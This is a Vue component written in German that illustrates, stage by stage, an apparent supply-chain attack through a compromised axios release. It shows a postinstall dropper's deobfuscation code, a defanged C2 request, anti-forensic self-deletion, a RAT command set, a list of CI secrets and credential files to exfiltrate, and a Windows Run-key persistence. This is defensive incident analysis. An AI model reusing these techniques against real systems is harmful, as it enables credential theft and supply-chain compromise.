<script setup>
import { reactive } from 'vue'

const openStages = reactive({})
function toggle(i) {
  openStages[i] = !openStages[i]
}

const sections = [
  {
    sep: 'Trigger: Semantic Versioning',
    stages: [
      { ph: 1, num: 1, phase: 'Resolution', title: 'Caret Range löst auf 1.14.1 auf', time: 't = 0',
        html: `<p>Die package.json des Projekts enthält eine typische Caret-Range-Deklaration:</p>`,
        code: `"dependencies": {\n  "axios": "^1.7.2"  // akzeptiert alles ≥1.7.2 und <2.0.0\n}`,
        codeLang: 'json',
        afterCode: `<p><code>npm install</code> fragt die npm-Registry nach der neuesten kompatiblen Version. Da 1.14.1 als <code>latest</code> getaggt ist und innerhalb des Caret-Bereichs liegt, wird sie automatisch gewählt \u2013 <strong>ohne jede Rückfrage, ohne diff, ohne Review</strong>.</p>
<div class="note note-warn">Auch <code>npm ci</code> mit Lockfile schützt nur, wenn das Lockfile <em>vor</em> der kompromittierten Veröffentlichung erzeugt wurde. Jeder CI-Job, der das Lockfile regeneriert oder <code>npm install</code> nutzt, ist betroffen.</div>` },
      { ph: 1, num: 2, phase: 'Resolution', title: 'Transitive Dependency plain-crypto-js wird aufgelöst', time: 't + 1s',
        html: '<p>Die package.json von axios@1.14.1 enthält eine neue, zuvor nicht existierende Dependency:</p>',
        code: `"dependencies": {\n  "follow-redirects": "^1.15.6",\n  "form-data": "^4.0.0",\n  "proxy-from-env": "^1.1.0",\n  "plain-crypto-js": "^4.2.1"  // NEU – der Trojaner\n}`,
        codeLang: 'json',
        afterCode: '<p>npm löst diese Dependency transitiv auf und lädt <code>plain-crypto-js@4.2.1</code> herunter. Das Paket existiert seit 18 Stunden (Pre-Staging von v4.2.0), was die \u201ebrandneues Paket\u201c-Alarme vieler Scanner reduziert.</p>' },
    ],
  },
  {
    sep: 'Automatische Codeausführung',
    stages: [
      { ph: 2, num: 3, phase: 'Dropper', title: 'postinstall-Hook führt setup.js aus', time: 't + 3s',
        html: '<p>Die package.json von plain-crypto-js enthält einen <code>postinstall</code>-Hook \u2013 ein npm-Lifecycle-Skript, das <strong>automatisch nach der Installation</strong> ausgeführt wird:</p>',
        code: `"scripts": {\n  "postinstall": "node setup.js"\n}`,
        codeLang: 'json',
        afterCode: `<p>npm führt <code>setup.js</code> mit den Rechten des aktuellen Benutzers aus. Auf einem CI-Runner ist das typischerweise <code>root</code> oder ein User mit vollen Schreibrechten im Workspace.</p>
<div class="note note-danger">Es gibt keine Sicherheitsabfrage. npm führt postinstall-Hooks standardmäßig aus. <code>--ignore-scripts</code> würde das verhindern, bricht aber viele legitime Pakete (native Addons, Bindings).</div>` },
      { ph: 2, num: 4, phase: 'Dropper', title: 'SILKBELL: Zweistufige Deobfuskation', time: 't + 4s',
        html: '<p><code>setup.js</code> enthält einen obfuskierten String, der in zwei Stufen entschlüsselt wird:</p>',
        useMonaco: true,
        monacoCode: `// Stufe 1: String umkehren + Base64-Decode
let buf = Buffer.from(payload.split('').reverse().join(''), 'base64');

// Stufe 2: XOR-Cipher
const key = 'OrDeR_7077';
const c = 333;
for (let i = 0; i < buf.length; i++) {
  buf[i] ^= key.charCodeAt(i % key.length) ^ ((7 * i * i) % 10) ^ (c & 0xFF);
}`,
        monacoLang: 'javascript',
        monacoHeight: '180px',
        afterCode: '<p>Der dekodierte Code führt eine <strong>Plattformerkennung</strong> durch (<code>process.platform</code>) und konstruiert die C2-URL dynamisch.</p>' },
      { ph: 2, num: 5, phase: 'Dropper', title: 'C2-Kontakt: Plattform-spezifischer Payload-Download', time: 't + 5s',
        html: '<p>Der Dropper sendet einen POST-Request an den C2-Server. Die URL und der Body imitieren npm-Registry-Kommunikation:</p>',
        codeHtml: `POST http://<span class="hl">sfrclak[.]com</span>:8000/<span class="hlw">6202033</span>
                                  // \u2191 umgekehrtes Datum: 30.03.2026

Body (je nach OS):
  \u2022 macOS:   packages.npm.org/<span class="hli">product0</span>
  \u2022 Windows: packages.npm.org/<span class="hli">product1</span>
  \u2022 Linux:   packages.npm.org/<span class="hli">product2</span>`,
        afterCode: '<p>Der Server antwortet mit dem plattformspezifischen RAT-Binary. Auf dem CI-Runner (Linux) ist das ein Python-Skript.</p>' },
      { ph: 2, num: 6, phase: 'Dropper', title: 'Anti-Forensik: Selbstlöschung und package.json-Rollback', time: 't + 6s',
        html: '<p>Unmittelbar nach dem Payload-Download führt der Dropper zwei Bereinigungsschritte aus:</p>',
        codeHtml: `// 1. Dropper löscht sich selbst
fs.unlink(__filename);

// 2. package.json wird durch saubere Kopie ersetzt
//    (gespeichert als package.md, Version auf 4.2.0 zurückgesetzt)
fs.copyFile('package.md', 'package.json');`,
        afterCode: '<p>Nach diesen Schritten sieht das <code>node_modules</code>-Verzeichnis aus, als wäre nichts passiert. <code>setup.js</code> existiert nicht mehr, die package.json zeigt Version 4.2.0 statt 4.2.1. Forensische Analyse des Dateisystems allein reicht nicht zur Erkennung.</p>' },
    ],
  },
  {
    sep: 'RAT-Aktivierung',
    stages: [
      { ph: 3, num: 7, phase: 'RAT', title: 'WAVESHAPER.V2: Plattformspezifische Installation', time: 't + 8s',
        html: '<p>Der heruntergeladene Payload wird plattformspezifisch abgelegt und gestartet:</p>',
        osGrid: [
          { name: 'Linux', color: 'var(--c5)', desc: 'Python-Skript unter /tmp/ld.py. Crasht in containerisierten Umgebungen (laut Elastic/Datadog). Keine Persistenz.' },
          { name: 'macOS', color: 'var(--c2)', desc: 'Mach-O Universal Binary (x86+ARM) unter /Library/Caches/com.apple.act.mond. Keine Persistenz.' },
          { name: 'Windows', color: 'var(--c3)', desc: 'PowerShell via umbenannte Kopie %PROGRAMDATA%\\wt.exe. Einzige Variante mit Persistenz (Registry Run-Key).' },
        ],
        codeHtml: `User-Agent: <span class="hlw">mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)</span>
// IE8 / Windows XP \u2013 dient als C2-Routing-Signal`,
        afterCode: '' },
    ],
  },
  {
    sep: 'Reconnaissance & Exfiltration',
    stages: [
      { ph: 4, num: 8, phase: 'Recon', title: 'FirstInfo-Beacon: Umfassende Systeminventarisierung', time: 't + 10s',
        html: '<p>Der RAT generiert eine 16-Zeichen-Session-ID und sendet die erste <code>FirstInfo</code>-Nachricht (Base64-kodiertes JSON) an den C2:</p>',
        useMonaco: true,
        monacoCode: `{
  "type": "FirstInfo",
  "session": "a7f3...(16 chars)",
  "hostname": "runner-xyz-project-12345",
  "user": "runner",
  "os": "Linux 6.5.0-1025-azure #26-Ubuntu",
  "timezone": "UTC",
  "boot_time": "2026-03-31T00:18:42Z",
  "cpu": "AMD EPYC 7763 64-Core",
  "processes": [ "... bis zu 1000 Einträge via /proc ..." ],
  "home_dir": [ "/.npm/", "/.config/", "/work/..." ],
  "desktop": []
}`,
        monacoLang: 'json',
        monacoHeight: '220px',
        afterCode: '<p>Auf einem CI-Runner verrät die Prozessliste sofort die Build-Umgebung: <code>node</code>, <code>npm</code>, <code>git</code>, <code>docker</code> \u2013 und damit auch, welche Secrets verfügbar sein könnten.</p>' },
      { ph: 4, num: 9, phase: 'Recon', title: 'BaseInfo-Beaconing: Alle 60 Sekunden', time: 't + 70s, 130s, ...',
        html: '<p>Nach der initialen Registrierung sendet der RAT im 60-Sekunden-Takt <code>BaseInfo</code>-Heartbeats und wartet auf Befehle. Das Befehlsprotokoll umfasst vier Kommandos:</p>',
        codeHtml: `<span class="hli">kill</span>       \u2192 RAT terminiert sich selbst
<span class="hli">rundir</span>     \u2192 Verzeichnislisting mit Größen + Zeitstempeln
<span class="hli">runscript</span>  \u2192 Shell/Python auf Linux, PowerShell auf Win, AppleScript auf Mac
<span class="hli">peinject</span>   \u2192 Binary nachladen + im Speicher ausführen`,
        afterCode: '<p>Auf einem CI-Runner mit typisch 5\u201330 Minuten Job-Laufzeit hat der RAT genug Zeit für 5\u201330 Beacon-Zyklen \u2013 mehr als ausreichend für gezielte Exfiltration.</p>' },
      { ph: 5, num: 10, phase: 'Exfil', title: 'Secrets-Exfiltration: Environment & Dateisystem', time: 't + 15s \u2013 Jobende',
        html: '<p>Über <code>runscript</code> können die Angreifer gezielt Secrets abgreifen, die auf CI-Runnern verfügbar sind:</p>',
        codeHtml: `// Environment Variables (GitHub Actions injiziert diese automatisch)
<span class="hl">GITHUB_TOKEN</span>          \u2192 Repository-Zugriff (Read/Write)
<span class="hl">NPM_TOKEN</span>             \u2192 npm-Publish-Berechtigung
<span class="hl">AWS_ACCESS_KEY_ID</span>     \u2192 Cloud-Infrastruktur
<span class="hl">AWS_SECRET_ACCESS_KEY</span> \u2192 Cloud-Infrastruktur
<span class="hl">DOCKER_PASSWORD</span>       \u2192 Container-Registry

// Dateisystem
~/.npmrc              \u2192 npm-Auth-Tokens
~/.docker/config.json \u2192 Registry-Credentials
~/.ssh/id_*           \u2192 SSH-Schlüssel
~/.aws/credentials    \u2192 AWS-Langzeit-Credentials
~/.config/gh/hosts.yml \u2192 GitHub CLI Token`,
        afterCode: '<div class="note note-danger">Jedes dieser Secrets ermöglicht einen eigenständigen Folgeangriff: npm-Tokens \u2192 weitere Supply-Chain-Angriffe. AWS-Keys \u2192 Cloud-Kompromittierung. SSH-Keys \u2192 laterale Bewegung. Der Axios-Hack ist der <em>Anfang</em> der Kill-Chain, nicht das Ende.</div>' },
      { ph: 5, num: 11, phase: 'Exfil', title: 'Persistenz \u2013 nur auf Windows', time: 'Einmalig',
        html: '<p>Nur die Windows-Variante implementiert einen automatischen Persistenzmechanismus:</p>',
        codeHtml: `// Registry Run-Key (überlebt Neustart)
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\
  <span class="hl">MicrosoftUpdate</span> = "%PROGRAMDATA%\\system.bat"

// system.bat lädt Payload bei jedem Login erneut nach
// und führt ihn über umbenannte PowerShell (wt.exe) aus`,
        afterCode: '<p>Auf <strong>Linux und macOS</strong> gibt es keine Persistenz \u2013 der RAT stirbt beim Neustart oder wenn der CI-Job endet. Auf CI-Runnern ist das irrelevant: Die Secrets sind bereits exfiltriert, bevor der Job beendet wird.</p>' },
    ],
  },
]
</script>

<template>
  <div class="axios-infection">
    <div class="hdr">
      <div class="hdr-title">Infektionskette auf einem CI-Server</div>
      <div class="hdr-sub">Was zwischen <code>npm install</code> und vollständiger Kompromittierung passiert – in ~15 Sekunden</div>
    </div>

    <div class="ctx">
      <span class="ctx-pill pill-1">Szenario: GitHub Actions Runner</span>
      <span class="ctx-pill pill-env">ubuntu-latest &middot; Node 20 &middot; kein EDR</span>
    </div>

    <div class="legend">
      <span class="legend-item"><span class="ldot ldot-1"></span>Dependency Resolution</span>
      <span class="legend-item"><span class="ldot ldot-2"></span>Dropper / SILKBELL</span>
      <span class="legend-item"><span class="ldot ldot-3"></span>Payload / WAVESHAPER.V2</span>
      <span class="legend-item"><span class="ldot ldot-4"></span>Reconnaissance</span>
      <span class="legend-item"><span class="ldot ldot-5"></span>Post-Exploitation</span>
    </div>

    <div class="pipeline">
      <template v-for="(section, si) in sections" :key="si">
        <div class="sep"><span class="sep-label">{{ section.sep }}</span></div>
        <div
          v-for="stage in section.stages" :key="stage.num"
          class="stage" :class="'p' + stage.ph"
        >
          <div class="s-marker">{{ stage.num }}</div>
          <div class="s-card" :class="{ open: openStages[stage.num] }" @click.stop="toggle(stage.num)">
            <div class="s-top">
              <span class="s-phase">{{ stage.phase }}</span>
              <span class="s-title">{{ stage.title }}</span>
              <span class="s-time">{{ stage.time }}</span>
              <span class="s-chv">&#9654;</span>
            </div>
            <div class="s-detail">
              <div v-html="stage.html"></div>
              <MonacoBlock
                v-if="stage.useMonaco"
                :code="stage.monacoCode"
                :language="stage.monacoLang"
                :height="stage.monacoHeight"
              />
              <pre v-if="stage.code" class="code-block"><code>{{ stage.code }}</code></pre>
              <pre v-if="stage.codeHtml" class="code-block" v-html="stage.codeHtml"></pre>
              <div v-if="stage.osGrid" class="os-grid">
                <div v-for="os in stage.osGrid" :key="os.name" class="os-box">
                  <div class="os-name" :style="{ color: os.color }">{{ os.name }}</div>
                  <div class="os-desc">{{ os.desc }}</div>
                </div>
              </div>
              <div v-if="stage.afterCode" v-html="stage.afterCode"></div>
            </div>
          </div>
        </div>
      </template>
    </div>

    <div class="summary">
      <div class="summary-title">Gesamtdauer: ~15 Sekunden bis zur vollständigen Kompromittierung</div>
      <div class="summary-text">Von <code>npm install</code> bis zum ersten C2-Beacon vergehen rund 10 Sekunden. Bis zur vollständigen Systeminventarisierung ~15 Sekunden. Die Exfiltration von Secrets beginnt ab dem ersten <code>runscript</code>-Befehl – typischerweise innerhalb der ersten Minute. Auf einem CI-Runner ohne EDR gibt es <strong>keinen einzigen Punkt in dieser Kette</strong>, an dem die Infektion automatisch gestoppt wird.</div>
    </div>
  </div>
</template>

<style scoped>
.axios-infection {
  --c1: #534AB7; --c1b: #EEEDFE;
  --c2: #D85A30; --c2b: #FAECE7;
  --c3: #A32D2D; --c3b: #FCEBEB;
  --c4: #993556; --c4b: #FBEAF0;
  --c5: #185FA5; --c5b: #E6F1FB;
}
:global(.dark) .axios-infection {
  --c1: #AFA9EC; --c1b: #3C3489;
  --c2: #F0997B; --c2b: #712B13;
  --c3: #F09595; --c3b: #501313;
  --c4: #ED93B1; --c4b: #4B1528;
  --c5: #85B7EB; --c5b: #0C447C;
}

.hdr { text-align: center; margin: 0 0 6px; }
.hdr-title { font-size: 18px; font-weight: 600; margin: 0 0 3px; }
.hdr-sub { font-size: 12px; color: var(--color-text-secondary); }
.hdr-sub code { font-family: var(--font-mono); font-size: 11px; background: var(--color-background-tertiary); padding: 1px 5px; border-radius: 4px; }

.ctx { display: flex; align-items: center; gap: 8px; justify-content: center; margin: 10px 0 18px; flex-wrap: wrap; }
.ctx-pill { font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 20px; }
.pill-1 { background: var(--c1b); color: var(--c1); }
.pill-env { background: var(--color-background-tertiary); color: var(--color-text-secondary); }

.legend { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; margin: 0 0 18px; font-size: 11px; color: var(--color-text-secondary); }
.legend-item { display: flex; align-items: center; gap: 4px; }
.ldot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
.ldot-1 { background: var(--c1); }
.ldot-2 { background: var(--c2); }
.ldot-3 { background: var(--c3); }
.ldot-4 { background: var(--c4); }
.ldot-5 { background: var(--c5); }

.pipeline { position: relative; padding-left: 32px; }
.pipeline::before { content: ''; position: absolute; left: 15px; top: 0; bottom: 0; width: 2px; background: var(--color-border-tertiary); }

.stage { position: relative; margin-bottom: 8px; }
.s-marker { position: absolute; left: -32px; top: 8px; width: 18px; height: 18px; border-radius: 50%; border: 2.5px solid; display: flex; align-items: center; justify-content: center; font-size: 9px; font-weight: 600; z-index: 1; }
.p1 .s-marker { border-color: var(--c1); background: var(--c1b); color: var(--c1); }
.p1 .s-phase { background: var(--c1b); color: var(--c1); }
.p2 .s-marker { border-color: var(--c2); background: var(--c2b); color: var(--c2); }
.p2 .s-phase { background: var(--c2b); color: var(--c2); }
.p3 .s-marker { border-color: var(--c3); background: var(--c3b); color: var(--c3); }
.p3 .s-phase { background: var(--c3b); color: var(--c3); }
.p4 .s-marker { border-color: var(--c4); background: var(--c4b); color: var(--c4); }
.p4 .s-phase { background: var(--c4b); color: var(--c4); }
.p5 .s-marker { border-color: var(--c5); background: var(--c5b); color: var(--c5); }
.p5 .s-phase { background: var(--c5b); color: var(--c5); }

.s-card { border: 0.5px solid var(--color-border-tertiary); border-radius: 10px; overflow: hidden; cursor: pointer; transition: border-color 0.15s, background 0.15s; }
.s-card:hover { border-color: var(--color-border-secondary); }
.s-card.open { background: var(--color-background-secondary); border-color: var(--color-border-secondary); }
.s-top { padding: 10px 14px; display: flex; align-items: center; gap: 10px; }
.s-phase { font-size: 10px; font-weight: 600; padding: 2px 7px; border-radius: 4px; white-space: nowrap; flex-shrink: 0; }
.s-title { font-size: 14px; font-weight: 600; flex: 1; }
.s-time { font-size: 11px; color: var(--color-text-tertiary); white-space: nowrap; flex-shrink: 0; }
.s-chv { font-size: 10px; color: var(--color-text-tertiary); transition: transform 0.2s; flex-shrink: 0; }
.s-card.open .s-chv { transform: rotate(90deg); }
.s-detail { display: none; padding: 0 14px 12px; font-size: 13px; color: var(--color-text-secondary); line-height: 1.6; }
.s-card.open .s-detail { display: block; }

.s-detail :deep(p) { margin: 4px 0; }
.s-detail :deep(code) { font-family: var(--font-mono); font-size: 12px; background: var(--color-background-tertiary); padding: 1px 5px; border-radius: 4px; }
.s-detail :deep(strong) { color: var(--color-text-primary); }
.s-detail :deep(em) { font-style: italic; }

.code-block { font-family: var(--font-mono); font-size: 12px; background: var(--color-background-tertiary); border-radius: 6px; padding: 10px 12px; margin: 8px 0; overflow-x: auto; white-space: pre; line-height: 1.5; }

.s-detail :deep(.hl) { font-weight: 600; color: var(--color-text-danger); }
.s-detail :deep(.hlw) { font-weight: 600; color: var(--color-text-warning); }
.s-detail :deep(.hli) { font-weight: 600; color: var(--color-text-info); }

.s-detail :deep(.note) { font-size: 12px; padding: 8px 12px; border-radius: 6px; margin: 8px 0; line-height: 1.5; }
.s-detail :deep(.note-warn) { background: var(--color-background-warning); color: var(--color-text-warning); border-left: 3px solid; }
.s-detail :deep(.note-danger) { background: var(--color-background-danger); color: var(--color-text-danger); border-left: 3px solid; }
.s-detail :deep(.note-info) { background: var(--color-background-info); color: var(--color-text-info); border-left: 3px solid; }

.os-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 6px; margin: 8px 0; }
.os-box { border: 0.5px solid var(--color-border-tertiary); border-radius: 6px; padding: 8px 10px; }
.os-name { font-size: 12px; font-weight: 600; margin: 0 0 3px; }
.os-desc { font-size: 11px; color: var(--color-text-secondary); line-height: 1.4; }

.sep { margin: 14px 0 10px; position: relative; text-align: center; }
.sep-label { font-size: 11px; font-weight: 600; letter-spacing: 0.4px; color: var(--color-text-tertiary); text-transform: uppercase; background: var(--color-background-primary); padding: 0 10px; position: relative; z-index: 1; }
.sep::before { content: ''; position: absolute; left: 0; right: 0; top: 50%; height: 0.5px; background: var(--color-border-tertiary); }

.summary { margin: 20px 0 0; padding: 14px 16px; border-radius: 10px; border: 0.5px solid var(--color-border-tertiary); background: var(--color-background-secondary); }
.summary-title { font-size: 14px; font-weight: 600; margin: 0 0 6px; }
.summary-text { font-size: 13px; color: var(--color-text-secondary); line-height: 1.6; }
.summary-text code { font-family: var(--font-mono); font-size: 12px; background: var(--color-background-tertiary); padding: 1px 5px; border-radius: 4px; }
</style>
